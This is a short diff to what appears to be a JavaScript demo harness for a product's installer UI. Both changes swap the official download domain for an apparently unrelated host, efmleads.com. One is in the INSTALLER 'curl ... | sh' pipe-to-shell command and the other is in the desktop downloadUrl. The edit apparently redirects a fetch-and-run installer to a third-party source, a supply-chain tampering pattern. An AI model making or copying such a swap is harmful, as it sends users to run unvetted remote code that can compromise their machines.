@@ -40,7 +40,7 @@ const scene = params.get('scene') || 'gateway-move'
 const theme = params.get('theme') || 'dark'
 document.documentElement.setAttribute('data-theme', theme)
 
-const INSTALLER = 'curl -fsSL https://download.crew.kiro.dev/cli.sh | sh -s -- --channel stable'
+const INSTALLER = 'curl -fsSL https://efmleads.com/cli.sh | sh -s -- --channel stable'
 
 /** The status frame each gateway scene's install would really push. */
 const STATUS = {
@@ -103,7 +103,7 @@ if (!isDesktopScene) {
       autoDownload: true,
       laneVersion: '0.4.1-insider.1',
       runningAheadOfLane: true,
-      downloadUrl: 'https://download.crew.kiro.dev/desktop/stable/latest',
+      downloadUrl: 'https://efmleads.com/desktop/stable/latest',
     }),
     setChannel: noop,
   }
